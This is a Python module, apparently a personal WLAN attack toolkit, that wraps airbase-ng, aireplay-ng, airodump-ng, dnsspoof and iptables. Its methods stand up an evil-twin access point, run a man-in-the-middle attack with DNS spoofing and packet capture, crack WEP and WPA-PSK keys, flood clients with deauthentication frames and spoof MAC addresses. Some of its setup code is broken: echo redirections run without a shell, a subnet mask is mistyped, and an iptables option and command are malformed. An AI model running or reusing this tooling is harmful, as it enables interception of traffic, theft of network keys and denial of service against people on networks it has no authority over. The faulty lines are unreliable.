#!/usr/bin/env python3

import os
from subprocess import call, Popen
from tempfile import mkstemp
from time import sleep

__author__ = 'Youssef Seddik'
__version__ = '0.1'
__license__ = 'MIT License'


#GLOBAL VARIABLES IN ALL CAPS
DN = open(os.devnull, 'w')
OUTLOG = open(os.devnull, 'w')

class Wlan():
    """
    This module contains the following WLAN attacks:
        * Evil Tween attack
        * Man In The Middle attack
        * DNS spoofing attack(as a part of the MITM attack)
        * WEP key cracking attack
        * WPA-PSK key cracking attack
        * Deauthenticate clients from AP attack
        * Change wireless interface MAC(pyhisical) address attack
    """
    
    def __init__(self, tmpdir):
        self.tmpdir = tmpdir
        self.capfile = mkstemp('wlandump', 'cap', tmpdir)
        self.key = mkstemp('key', 'dot11', tmpdir)
    
    def evil_tween(self, bssid, essid, channel, interface):
        '''
        Basically like a MITM attack but imitates a specific AP, spoofing
        its BSSID, ESSID and channel
        '''

        proc1 = Popen(['airbase-ng', '--essid', essid, '-a', bssid, '-c',
            channel, interface], stdout=DN, stderr=DN)
        
        self.configure_route()
        self.configure_dhcp()

        call(['wireshark', '-k','-i', 'at0'], stderr=DN, stdout=DN)
        return [proc1]

    def mitm(self, bssid, essid, channel, interface, dnsspoofing=False):
        '''
        Launches a Man In The Middle attack, and opens 
        wireshark to see and inspect packets captured on the at0 interface
        '''
        
        proc1 = Popen(['airbase-ng', '--essid', essid, '-a', bssid, '-c', 
            str(channel), interface], stdout=DN, stderr=DN)

        self.configure_route()
        self.configure_dhcp()
        
        call(['/etc/init.d/isc-dhcp-server', 'start'], stdout=DN, stderr=DN)
        
        call(['wireshark', '-k','-i', 'at0'], stderr=DN, stdout=DN)
        
        if dnsspoofing:
            proc2 = Popen(['dnsspoof', '-i', 'at0', '-f', 'hosts'],
                    stderr=DN, stdout=DN)
            return [proc1, proc2]
        else:
            return [proc1]

    def configure_dhcp(self):
        '''
        Configures the DHCP server, its ranges and options and also the DNS
        server to use which in this case is Google's DNS server
        '''

        call(['echo', '\'authoritative;\'', '>', '/etc/dhcpd.conf'], stdout=DN, 
            stderr=DN)
        call(['echo', '\'default-lease-time 600;\'',  '>>', '/etc/dhcpd.conf'], 
            stdout=DN, stderr=DN)
        call(['echo', '\'max-lease-time 7200;\'',  '>>', '/etc/dhcpd.conf'], 
            stdout=DN, stderr=DN)
        call(['echo', '\'subnet 192.168.2.0 netmask 255.255.255.0 {\'',  '>>', 
            '/etc/dhcpd.conf'], stdout=DN, stderr=DN)
        call(['echo', '\'option routers 192.168.1.1;\'', '>>', '/etc/dhcpd.conf'], 
            stdout=DN, stderr=DN)
        call(['echo', '\'option subnet-mask 25.255.255.0;\'', '>>', 
            '/etc/dhcpd.conf'], stdout=DN, stderr=DN)
        call(['echo', '\'option domain-name "WifiGratuit";\'',  '>>', 
            '/etc/dhcpd.conf'], stdout=DN, stderr=DN)
        call(['echo', '\'option domain-name-servers 192.168.2.1;\'',  '>>', 
            '/etc/dhcpd.conf'], stdout=DN, stderr=DN)
        call(['echo', '\'range 192.168.2.2 192.168.2.40;\'',  '>>', 
            '/etc/dhcpd.conf'], stdout=DN, stderr=DN)
        call(['echo', '\'}\'',  '>>', '/etc/dhcpd.conf'], stdout=DN, stderr=DN)
        call(['echo', '\'INTERFACES="at0"\'', '>>', 
            '/etc/default/isc-dhcp-server'], stdout=DN, stderr=DN)
        call(['echo', '\'DHCPD_CONF=/etc/dhcpd.conf\''], stdout=DN, stderr=DN)

    def configure_route(self):
        '''
        Configures routing rules and IPTables rules to allow packet relaying,
        starts also the dnsmasq server and Apache Web server.
        Returns the two servers' processes in a table
        '''
 
        call(['ifconfig', 'at0', '192.168.2.1', 'netmask', '255.255.255.0',
            'up'], stdout=DN, stderr=DN)
        call(['route', 'add', '-net', '192.168.2.0', 'netmask',
            '255.255.255.0', 'gw', '192.168.2.1'] , stdout=DN, stderr=DN)
        call(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'], stdout=DN, 
                stderr=DN)
        call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'udp', '-j', 
            'DNAT', '--to', '192.168.1.1'], stdout=DN, stderr=DN)
        call(['iptables', '-P', 'FORWARD', 'ACCEPT'], stdout=DN, stderr=DN)
        call(['iptables', '--append', 'FORWARD', '--in-interface', 'at0', 
            '-j', 'ACCEPT'], stdout=DN, stderr=DN)
        call(['iptables', '--table', 'nat', '--append', 'POSTROUTING',
            '--out-inteface', 'eth0', '-j', 'MASQUERADE'], stdout=DN, stderr=DN)
        call(['iptables', 'eth0', 'up'], stdout=DN, stderr=DN)

    def crack_wep(self, bssid, channel, macclient, interface):
        '''Cracks a WEP key'''

        capfile1 = str(self.capfile[1])
        proc1 = Popen(['airodump-ng', '--channel', channel, '--bssid', 
            bssid, '--write', capfile1, interface], stdout=DN, stderr=DN)
        proc2 = Popen(['aireplay-ng', '--arpreplay', '-h', macclient, '-b', 
            bssid, interface], stdout=DN, stderr=DN)
        return {'proc1':proc1, 'proc2':proc2, 'cap':capfile1}

    def crack_wpapsk(self, bssid, channel, interface):
        '''
        Launches a WPA-PSK key recovery, using a dictionary/wordlist,
        requires the BSSID and channel of the AP, and the wireless
        interface to use.
        '''

        capfile1 = str(self.capfile[1])
        proc1 = Popen(['airodump-ng', '--channel', channel, '--bssid', 
            bssid, '--write', capfile1, interface], stdout=DN, stderr=DN)
        proc2 = Popen(['aireplay-ng', '-0', '30', '-a', bssid, 
            '--ignore-negative-one', interface], stdout=DN, stderr=DN)
        return {'proc1':proc1, 'proc2':proc2, 'cap':capfile1}

    def deauth_clients(self, bssid, interface, bssidc):
        '''
        Launches deauth attacks on the AP to disconnect clients attached
        to it; when the client MAC is given then the attack is better
        '''

        command = ['aireplay-ng', '--deauth=0', '-a', bssid, 
                '--ignore-negative-one']
        if bssidc != 0:
            command.append('-c')
            command.append(bssidc)
        command.append(interface)
        proc = Popen(command, stdout=DN, stderr=DN)
        return proc

    def change_mac(self, mac, interface):
        '''Changes wireless card physical - MAC address to the given one'''

        command = ['ifconfig', interface, 'hw', 'ether', mac]
        proc = Popen(command, stdout=DN, stderr=DN)
        return proc



